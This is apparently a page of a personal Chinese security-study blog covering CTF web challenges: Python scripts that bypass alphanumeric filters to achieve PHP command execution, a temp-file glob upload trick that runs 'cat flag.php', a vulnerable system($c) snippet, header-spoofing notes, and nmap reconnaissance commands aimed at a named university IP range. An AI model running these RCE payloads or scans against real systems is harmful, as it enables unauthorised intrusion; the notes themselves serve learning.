&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;    //可以替换成题目中的正则表达式</span><br><span class="line">    for i in range(256):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                if k &gt;= 32 and k &lt;= 126:</span><br><span class="line">                    a = &#x27;%&#x27; + hex(i)[2:].zfill(2)</span><br><span class="line">                    b = &#x27;%&#x27; + hex(j)[2:].zfill(2)</span><br><span class="line">                    result += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)</span><br><span class="line">    f = open(&#x27;rce.txt&#x27;, &#x27;w&#x27;)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line">#根据输入的命令在生成的txt中进行匹配</span><br><span class="line">def action(arg):</span><br><span class="line">    s1=&quot;&quot;</span><br><span class="line">    s2=&quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f=open(&quot;rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            if t==&quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0]==i:</span><br><span class="line">                s1+=t[2:5]</span><br><span class="line">                s2+=t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">    return(output)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    write_rce()</span><br><span class="line">    while True:</span><br><span class="line">        s1 = input(&quot;\n[+] your function：&quot;)</span><br><span class="line">        if s1 == &quot;exit&quot;:</span><br><span class="line">            break</span><br><span class="line">        s2 = input(&quot;[+] your command：&quot;)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;c&#x27;:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(&quot;\n[*] result:\n&quot;+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h3 id="无数字、字母实现RCE读取文件方法二："><a href="#无数字、字母实现RCE读取文件方法二：" class="headerlink" title="无数字、字母实现RCE读取文件方法二："></a>无数字、字母实现RCE读取文件方法二：</h3><p>两个有趣的Linux shell知识点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那就可以利用<code>.</code>来执行它。 这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母，最后一位大概率是大写。</p>
<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。.</p>
<p>深入理解glob通配符，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
<p>我们再来看看之前列出可能干扰我们的文件：</p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
<p>那么，我们可以利用<code>[@-[]</code>来表示大写字母</p>
<p>显然这一招是管用的。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>上传脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">while True:</span><br><span class="line">    url = &quot;http://test.com/?c=. /???/????????[@-[]&quot;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&quot;dota.txt&quot;, &quot;cat flag.php&quot;)&#125;)</span><br><span class="line">    flag = r.text.split(&#x27;flag&#x27;)     //检测返回包中的字符串并返回</span><br><span class="line">    if len(flag) &gt;1:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<h3 id="其他知识点："><a href="#其他知识点：" class="headerlink" title="其他知识点："></a>其他知识点：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”语句，意思是写入的内容会永远消失，也就是不进行回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt</span><br><span class="line">2：/dev/null 代表空设备文件</span><br><span class="line">3：2&gt; 表示stderr标准错误</span><br><span class="line">4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</span><br><span class="line">5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</span><br><span class="line">因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</span><br><span class="line"></span><br><span class="line">那么本文标题的语句执行过程为：</span><br><span class="line">1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。</span><br><span class="line">2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</span><br></pre></td></tr></table></figure>

<p>也就是我们如果输入<code>?c=ls</code>，输出就会被吞掉不进行回显，其实很简单，用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔，也可以用%0a换行</p>
<h3 id="在shell中可以利用-和-进行构造数字的方法："><a href="#在shell中可以利用-和-进行构造数字的方法：" class="headerlink" title="在shell中可以利用$和()进行构造数字的方法："></a>在shell中可以利用<code>$</code>和<code>()</code>进行构造数字的方法：</h3><p>有道题提示flag在36.php中，system中已经写好cat和php，所以我们只需要构造出36即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(())代表做一次运算，因为里面为空，也表示值为0</span><br><span class="line">$((~$(())))对0作取反运算，值为-1</span><br><span class="line">$(($((~$(())))$((~$(())))))-1-1，也就是(-1)+(-1)为-2，所以值为-2</span><br><span class="line">$((~$(($((~$(())))$((~$(())))))))再对-2做一次取反得到1，所以值为1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所以我们只要构造出-37，再进行取反，即可得到我们想要的数字36</span><br><span class="line">写一个脚本进行构造:</span><br><span class="line">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>

<h3 id="返回的页面含有数字和字母会被替换成？的情况："><a href="#返回的页面含有数字和字母会被替换成？的情况：" class="headerlink" title="返回的页面含有数字和字母会被替换成？的情况："></a>返回的页面含有数字和字母会被替换成？的情况：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里匹配到的所有数字字母都会被?覆盖所以我们这里加一个exit()函数强制退出，使得后面处理的函数无法执行直接返回结果</span><br></pre></td></tr></table></figure>

<h3 id="题目有open-basedir和disable-functions限制的情况："><a href="#题目有open-basedir和disable-functions限制的情况：" class="headerlink" title="题目有open_basedir和disable_functions限制的情况："></a>题目有open_basedir和disable_functions限制的情况：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</span><br><span class="line"></span><br><span class="line">disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</span><br></pre></td></tr></table></figure>

<p>这里直接有可以用的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-http" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/22/http/" class="article-date">
  	<time datetime="2025-04-22T13:18:53.377Z" itemprop="datePublished">2025-04-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>HTTP 请求头 的一部分，表示当前请求页面的来源页面地址</strong></p>
<p><strong>User-Agent</strong> 是一个HTTP请求头部，包含了关于客户端（通常是用户的Web浏览器）的信息。通过User-Agent，服务器可以识别客户端的类型和版本，从而提供适当的响应。</p>
<p><strong>HTTP 请求头，用于识别通过代理服务器连接到 Web 服务器的客户端的原始 IP 地址</strong> </p>
<h3 id="REMOTE-ADDR，X-Forwarded-For，HTTP-CLIENT-IP，X-Real-IP区别"><a href="#REMOTE-ADDR，X-Forwarded-For，HTTP-CLIENT-IP，X-Real-IP区别" class="headerlink" title="REMOTE_ADDR，X-Forwarded-For，HTTP_CLIENT_IP，X-Real-IP区别"></a>REMOTE_ADDR，X-Forwarded-For，HTTP_CLIENT_IP，X-Real-IP区别</h3><p>REMOTE_ADDR：客户端与服务器连接是的IP地址。如果客户端通过代理访问服务端，在REMOTE_ADDR表示与服务器最近的代理服务器的IP地址；<br>HTTP_CLIENT_IP： 是代理服务器发送的HTTP头。<br>X-Forwarded-For：是一个 HTTP 扩展头部。格式：X-Forwarded-For: client, proxy1, proxy2，由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。<br>如：<br>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：X-Forwarded-For: IP0, IP1, IP2注意列表中并没有 IP3，IP3 可以在服务端通过 REMOTE_ADD字段获得.</p>
<p>(client-IP)</p>
<p>vim 伪造代理</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  	<time datetime="2025-04-22T11:41:01.697Z" itemprop="datePublished">2025-04-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>[TOC]</p>
<p>######<strong>分类：</strong></p>
<ol>
<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
<li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li>
<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
<li>子域名收集，旁站，C段等</li>
<li>google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</li>
<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
<li>传输协议，通用漏洞，exp，github源码等</li>
</ol>
<h6 id="注-cdn-："><a href="#注-cdn-：" class="headerlink" title="注(cdn)："></a><strong>注(cdn)：</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CND在网络技术中通常指的是内容分发网络（Content Delivery Network），它是一种分布式网络，旨在通过在多个地理位置部署服务器来优化数据的传输速度和可靠性。CND的核心功能是加速静态资源的加载，例如网站上的图片、媒体文件以及JavaScript和CSS等文件。这是通过在不同地区设置服务器节点来实现的，当用户访问网站时，他们会从最近的节点获取资源，从而减少了数据传输的延迟和提高了加载速度。</span><br></pre></td></tr></table></figure>

<h6 id="注-指纹识别"><a href="#注-指纹识别" class="headerlink" title="注(指纹识别):"></a><strong>注(指纹识别):</strong></h6><ul>
<li>操作系统指纹：识别目标主机操作系统（如 Windows、Linux、macOS 等）的版本。</li>
<li>服务版本指纹：识别目标主机开放端口上运行的服务（如 Apache、Nginx、MySQL 等）及其版本。</li>
<li>Web 应用指纹：识别网站使用的 CMS（如 WordPress、Joomla）或 Web 服务技术（如 PHP、ASP.NET）。</li>
<li>硬件设备指纹：识别目标网络中的硬件设备及其特征（如路由器、交换机、防火墙）。</li>
<li>SSL&#x2F;TLS 指纹：识别目标使用的 SSL&#x2F;TLS 配置及其安全性（例如支持的加密算法、证书颁发机构等）。</li>
</ul>
<h3 id="一、敏感文件及目录"><a href="#一、敏感文件及目录" class="headerlink" title="一、敏感文件及目录"></a>一、敏感文件及目录</h3><ul>
<li><p>robots.txt</p>
</li>
<li><p>index.php~</p>
</li>
<li><p>.index.php.swp</p>
</li>
</ul>
<h4 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a>Nmap端口扫描</h4><p><strong>①</strong> 主机发现</p>
<p>-sn (ping扫描方式): nmap -sn 211.84.228.180&#x2F;24(安阳工学院的ip地址)  –快速发现网段内存活主机</p>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018204614567.png" alt="image-20251018204614567"></p>
<p>eg.</p>
<p>​	Host is up (0.00087s latency). 意思是目标主机在线(即网络是通的 主机正在运行)</p>
<p>​	latency(延迟)表示网速非常快 很可能是在同一个局域网</p>
<p>​	Nmap done: 1 IP address (1 host up) scanned in 10.19 secondsNmap 扫描完成。总共扫描了 1 个 IP 地址，其中有 1 台主机是在线的。整个扫描过程耗时 10.19 秒</p>
<p>②<strong>端口扫描(重点)</strong></p>
<p><strong>Nmap通过探测将端口划分为6个状态：</strong></p>
<ul>
<li>open：端口是开放的。</li>
<li>closed：端口关闭，没有服务监听，但主机是活动的。</li>
<li>filtered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态。</li>
<li>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定（通常用于 ACK 扫描）。</li>
<li>open|filtered：端口是开放的或被屏蔽（通常用于 UDP 扫描）。</li>
<li>closed|filtered ：端口是关闭的或被屏蔽（较少见）。</li>
</ul>
<p><strong>1.</strong></p>
<p>-sS(TCP SYN扫描)  nmap -sS 211.84.228.180&#x2F;24(nmap的m默认扫描方式，在没有输入参数的时候默认受用这种方式)</p>
<p><strong>2.</strong></p>
<p>-sV(服务版本检测)  nmap -sV 211.84.228.180 识别目标主机上运行的服务机器版本信息</p>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018211538223.png" alt="image-20251018211538223"></p>
<p><strong>3.</strong></p>
<p>-p (扫描指定端口) nmap -p &lt;端口扫描&gt; &lt;目标&gt;</p>
<table>
<thead>
<tr>
<th><strong>格式</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-p 80</code></td>
<td>扫描单个端口（如 80）。</td>
</tr>
<tr>
<td><code>-p 80 443</code></td>
<td>扫描多个端口（如 80 和 443）。</td>
</tr>
<tr>
<td><code>-p 1-100</code></td>
<td>扫描端口范围（如 1 到 100）。</td>
</tr>
<tr>
<td><code>-p-</code></td>
<td>扫描所有 65535 个端口。</td>
</tr>
<tr>
<td><code>-p U:53,T:80,443</code></td>
<td>扫描指定协议的端口（如 UDP 53 和 TCP 80、443）。</td>
</tr>
</tbody></table>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018211754547.png" alt="image-20251018211754547"></p>
<p><strong>4.</strong></p>
<p> -O (设备信息和操作系统探测) nmap -O  211.84.228.180</p>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018212110330.png" alt="image-20251018212110330"></p>
<p><strong>5.</strong> </p>
<p>-A(激进模式) nmap -A 211.84.228.180</p>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018212540382.png" alt="image-20251018212540382"></p>
<p><strong>6.</strong></p>
<p>-F(快速模式) nmap -F sV 211.84.228.180</p>
<p><img src="/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20251018212812300.png" alt="image-20251018212812300"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 zhangsuhong
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>